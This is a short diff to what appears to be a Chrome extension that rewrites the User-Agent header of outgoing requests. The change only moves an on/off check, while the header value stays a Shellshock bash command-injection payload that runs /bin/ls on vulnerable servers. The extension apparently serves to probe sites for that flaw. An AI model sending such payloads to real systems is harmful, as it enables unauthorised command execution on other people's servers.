@@ -21,12 +21,14 @@ chrome.webRequest.onBeforeSendHeaders.addListener(
       // no header
       var aHeaders = sReq.requestHeaders;
       console.log(aHeaders);
-      aHeaders.forEach(function(header, i) {
-        if (header.name == 'User-Agent') {
-            if(localStorage.getItem('UASHS_isactive') == '0')
+
+      if(localStorage.getItem('UASHS_isactive') == '0') {
+          aHeaders.forEach(function(header, i) {
+            if (header.name == 'User-Agent') {
                 header.value = "() { test;};echo 'Content-type: text/plain'; echo; echo; /bin/ls";
-        }
-      });
+            }
+          });
+      }
       return {requestHeaders: aHeaders};
     },
     {
